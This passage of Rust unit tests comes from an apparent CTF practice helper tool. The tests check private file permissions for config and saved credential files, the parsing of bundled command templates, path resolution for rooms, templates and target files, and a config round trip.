        std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
        let f = d.join("config.toml");
        std::fs::write(&f, "old").unwrap();
        std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o644)).unwrap();
        create_private_dir(&d).unwrap();
        write_private(&f, "PASS = 'x'").unwrap();
        assert_eq!(mode(&d), 0o700);
        assert_eq!(mode(&f), 0o600);
        assert_eq!(std::fs::read_to_string(&f).unwrap(), "PASS = 'x'");
        // new files are created 0600, a stricter mode is left alone
        let n = d.join("sub").join("new.toml");
        create_private_dir(n.parent().unwrap()).unwrap();
        write_private(&n, "").unwrap();
        assert_eq!(mode(&n), 0o600);
        std::fs::set_permissions(&n, std::fs::Permissions::from_mode(0o400)).unwrap();
        restrict(&n, 0o600).unwrap();
        assert_eq!(mode(&n), 0o400);
        // loot saves the same way
        let loot = d.join("loot").join("10.0.0.1.toml");
        crate::loot::save(&loot, &[crate::loot::Cred { user: "a".into(), pass: "b".into(), ..Default::default() }]);
        assert_eq!(mode(&loot), 0o600);
        assert_eq!(mode(loot.parent().unwrap()), 0o700);
        std::fs::remove_dir_all(&d).ok();
    }

    #[test]
    fn bundled_parses() {
        let c = parse_commands(BUNDLED, false);
        assert!(c.len() > 40);
        assert!(c.iter().all(|x| !x.template.is_empty()));
    }

    fn tmp(tag: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("pivt-paths-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn rooms_dir_precedence() {
        let home = tmp("rooms");
        let data = home.join(".local/share");
        let env = std::ffi::OsStr::new("/srv/ctf");
        // $CTF_ROOT wins over everything
        assert_eq!(resolve_rooms_dir(Some(env), "~/x", &home, &data), PathBuf::from("/srv/ctf"));
        // empty env counts as unset; config next, with ~ expanded
        let empty = std::ffi::OsStr::new("");
        assert_eq!(resolve_rooms_dir(Some(empty), "~/boxes", &home, &data), home.join("boxes"));
        // nothing set, no legacy dir: XDG data dir
        assert_eq!(resolve_rooms_dir(None, "", &home, &data), data.join("pivt/rooms"));
        // legacy ~/TryHackMe is kept once it exists
        std::fs::create_dir_all(home.join("TryHackMe")).unwrap();
        assert_eq!(resolve_rooms_dir(None, "", &home, &data), home.join("TryHackMe"));
        assert_eq!(resolve_rooms_dir(None, "/abs", &home, &data), PathBuf::from("/abs"));
        std::fs::remove_dir_all(&home).ok();
    }

    #[test]
    fn room_template_only_when_configured_or_legacy_exists() {
        let home = tmp("tpl");
        assert_eq!(resolve_room_template(None, &home), None, "new user: copy nothing");
        assert_eq!(resolve_room_template(Some("~/t.md"), &home), Some(home.join("t.md")));
        let legacy = legacy_room_template(&home);
        std::fs::create_dir_all(legacy.parent().unwrap()).unwrap();
        std::fs::write(&legacy, "x").unwrap();
        assert_eq!(resolve_room_template(None, &home), Some(legacy));
        assert_eq!(resolve_room_template(Some(""), &home), None, "\"\" disables the legacy copy");
        std::fs::remove_dir_all(&home).ok();
    }

    #[test]
    fn target_sync_only_when_configured_or_file_exists() {
        let home = tmp("tgt");
        let def = home.join(".cache/ctf-target");
        assert_eq!(resolve_target_file(None, &home, &def), None, "new user: off");
        assert_eq!(resolve_target_file(Some("~/t"), &home, &def), Some(home.join("t")));
        std::fs::create_dir_all(def.parent().unwrap()).unwrap();
        std::fs::write(&def, "10.10.10.3\n").unwrap();
        assert_eq!(resolve_target_file(None, &home, &def), Some(def.clone()), "existing setup kept");
        assert_eq!(resolve_target_file(Some(" "), &home, &def), None, "explicitly off");
        assert_eq!(read_ctf_target(&def).as_deref(), Some("10.10.10.3"));
        write_ctf_target(&def, "10.10.10.4");
        assert_eq!(read_ctf_target(&def).as_deref(), Some("10.10.10.4"));
        std::fs::remove_dir_all(&home).ok();
    }

    #[test]
    fn path_settings_roundtrip_without_adding_keys() {
        // unset Option settings must stay unset (absent) after a save
        let txt = toml::to_string_pretty(&Config::default()).unwrap();
        assert!(!txt.contains("room_template") && !txt.contains("sync_target_file") && !txt.contains("rooms_dir"), "{txt}");
        let mut c = Config::default();
        c.vars.insert("RHOST".into(), "1.2.3.4".into());
        c.sync_target_file = Some(String::new());
        c.room_template = Some("~/tpl.md".into());
        c.rooms_dir = "~/rooms".into();
        let back: Config = toml::from_str(&toml::to_string_pretty(&c).unwrap()).unwrap();
        assert_eq!(back.sync_target_file.as_deref(), Some(""));
        assert_eq!(back.room_template.as_deref(), Some("~/tpl.md"));
        assert_eq!(back.rooms_dir, "~/rooms");
        assert_eq!(back.vars.get("RHOST").map(String::as_str), Some("1.2.3.4"));
    }
}
